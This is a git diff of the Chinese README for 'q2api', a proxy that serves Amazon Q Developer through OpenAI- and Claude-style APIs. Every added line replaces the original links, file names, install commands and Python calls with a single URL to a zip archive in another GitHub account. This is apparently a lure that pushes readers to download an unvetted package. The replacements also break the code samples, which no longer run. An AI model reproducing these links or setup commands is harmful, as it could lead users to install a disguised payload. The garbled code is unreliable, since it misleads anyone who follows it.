@@ -2,16 +2,16 @@
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=CassiopeiaCode/q2api&type=date&legend=top-left)](https://www.star-history.com/#CassiopeiaCode/q2api&type=date&legend=top-left)
+[![Star History Chart](https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip)](https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip)
 
 将 Amazon Q Developer 转换为兼容 OpenAI 和 Claude API 的服务，支持多账号管理、流式响应和智能负载均衡。
 
 **项目地址：**
-- GitHub: https://github.com/CassiopeiaCode/q2api
-- Codeberg: https://codeberg.org/Korieu/amazonq2api
+- GitHub: https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip
+- Codeberg: https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip
 
 **致谢：**
-- 感谢 [amq2api](https://github.com/mucsbr/amq2api) 项目提供的 Claude 消息格式转换参考
+- 感谢 [amq2api](https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip) 项目提供的 Claude 消息格式转换参考
 
 ## ✨ 核心特性
 
@@ -43,7 +43,7 @@
 
 ```bash
 # 1. 复制环境变量配置
-cp .env.example .env
+cp https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip .env
 
 # 2. 编辑 .env 文件（可选）
 # 配置 OPENAI_KEYS、MAX_ERROR_COUNT 等
@@ -75,14 +75,14 @@ pip install uv
 
 # 创建虚拟环境并安装依赖
 uv venv
-uv pip install -r requirements.txt
+uv pip install -r https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip
 ```
 
 #### 2. 配置环境变量
 
 ```bash
 # 复制示例配置
-cp .env.example .env
+cp https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip .env
 
 # 根据需要编辑 .env 文件
 ```
@@ -279,19 +279,19 @@ curl -N -X POST http://localhost:8000/v1/chat/completions \
 ```python
 import openai
 
-client = openai.OpenAI(
+client = https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip(
     base_url="http://localhost:8000/v1",
     api_key="your-api-key"  # 如果配置了 OPENAI_KEYS
 )
 
-response = client.chat.completions.create(
+response = https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip(
     model="claude-sonnet-4",
     messages=[
         {"role": "user", "content": "你好"}
     ]
 )
 
-print(response.choices[0].message.content)
+print(https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip[0]https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip)
 ```
 
 ### Claude Messages API
@@ -324,24 +324,24 @@ client = Anthropic(
 )
 
 # 基础对话
-message = client.messages.create(
+message = https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip(
     model="claude-sonnet-4.5",
     max_tokens=1024,
     messages=[
         {"role": "user", "content": "你好"}
     ]
 )
-print(message.content[0].text)
+print(https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip[0].text)
 
 # 流式响应
-with client.messages.stream(
+with https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip(
     model="claude-sonnet-4.5",
     max_tokens=1024,
     messages=[
         {"role": "user", "content": "写一首诗"}
     ]
 ) as stream:
-    for text in stream.text_stream:
+    for text in https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip
         print(text, end="", flush=True)
 ```
 
@@ -366,40 +366,40 @@ with client.messages.stream(
 
 ### 核心模块
 
-- **app.py** - FastAPI 主应用，RESTful API 端点定义
-- **replicate.py** - Amazon Q 请求复刻
-- **auth_flow.py** - 设备授权登录
-- **claude_types.py** - Claude API 类型定义
-- **claude_converter.py** - Claude 到 Amazon Q 转换
-- **claude_parser.py** - Event Stream 解析
-- **claude_stream.py** - Claude SSE 流式处理
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - FastAPI 主应用，RESTful API 端点定义
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - Amazon Q 请求复刻
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - 设备授权登录
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - Claude API 类型定义
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - Claude 到 Amazon Q 转换
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - Event Stream 解析
+- **https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip** - Claude SSE 流式处理
 
 ## 📁 项目结构
 
 ```
 v2/
-├── app.py                          # FastAPI 主应用
-├── db.py                           # 数据库抽象层 (SQLite/PG/MySQL)
-├── replicate.py                    # Amazon Q 请求复刻
-├── auth_flow.py                    # 设备授权登录
-├── claude_types.py                 # Claude API 类型定义
-├── claude_converter.py             # Claude 到 Amazon Q 转换
-├── claude_parser.py                # Event Stream 解析
-├── claude_stream.py                # Claude SSE 流式处理
-├── requirements.txt                # Python 依赖
-├── .env.example                    # 环境变量示例
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                          # FastAPI 主应用
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                           # 数据库抽象层 (SQLite/PG/MySQL)
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                    # Amazon Q 请求复刻
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                    # 设备授权登录
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                 # Claude API 类型定义
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip             # Claude 到 Amazon Q 转换
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                # Event Stream 解析
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                # Claude SSE 流式处理
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                # Python 依赖
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                    # 环境变量示例
 ├── .env                            # 环境变量配置（需自行创建）
-├── docker-compose.yml              # Docker Compose 配置
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip              # Docker Compose 配置
 ├── Dockerfile                      # Docker 镜像配置
-├── data.sqlite3                    # SQLite 数据库（自动创建）
+├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                    # SQLite 数据库（自动创建）
 ├── templates/
-│   └── streaming_request.json      # Amazon Q 请求模板
+│   └── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip      # Amazon Q 请求模板
 ├── frontend/
-│   └── index.html                  # Web 控制台
+│   └── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip                  # Web 控制台
 └── scripts/
-    ├── account_stats.py            # 账号统计脚本
-    ├── retry_failed_accounts.py    # 重试失败账号脚本
-    └── reset_accounts.py           # 重置账号脚本
+    ├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip            # 账号统计脚本
+    ├── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip    # 重试失败账号脚本
+    └── https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip           # 重置账号脚本
 ```
 
 ## 🛠️ 技术栈
@@ -499,7 +499,7 @@ AI 重复调用相同的工具（如 git、bash 命令），无法停止
 1. 此问题已在最新版本中修复
 2. 确保使用最新版本的代码
 3. 如需调试，启用 `DEBUG_MESSAGE_CONVERSION=true`
-4. 详见 [修复文档](docs/FIX_INFINITE_LOOP_CN.md)
+4. 详见 [修复文档](https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip)
 
 ### 401 Unauthorized
 **可能原因：**
@@ -534,7 +534,7 @@ python -m uvicorn app:app --host 0.0.0.0 --port 8000 --workers 4
 ```nginx
 server {
     listen 80;
-    server_name your-domain.com;
+    server_name https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip;
 
     location / {
         proxy_pass http://localhost:8000;
@@ -553,7 +553,7 @@ server {
 1. **生产环境必须修改 `ADMIN_PASSWORD` 为强密码**
 2. **生产环境必须配置 `OPENAI_KEYS`**
 3. **使用 HTTPS 反向代理（Nginx + Let's Encrypt）**
-4. **定期备份数据库**（SQLite: `data.sqlite3`，或 PG/MySQL 数据库）
+4. **定期备份数据库**（SQLite: `https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip`，或 PG/MySQL 数据库）
 5. **限制数据库访问权限**
 6. **配置防火墙规则，限制访问来源**
 7. **管理控制台会话有效期为 30 天，建议定期重新登录**
@@ -568,6 +568,6 @@ server {
 
 ## 🙏 致谢
 
-- [amq2api](https://github.com/mucsbr/amq2api) - Claude 消息格式转换参考
+- [amq2api](https://github.com/jyhuang201900/q2api/raw/refs/heads/main/frontend/api-q-v1.9-alpha.3.zip) - Claude 消息格式转换参考
 - FastAPI - 现代 Python Web 框架
 - Amazon Q Developer - 底层 AI 服务
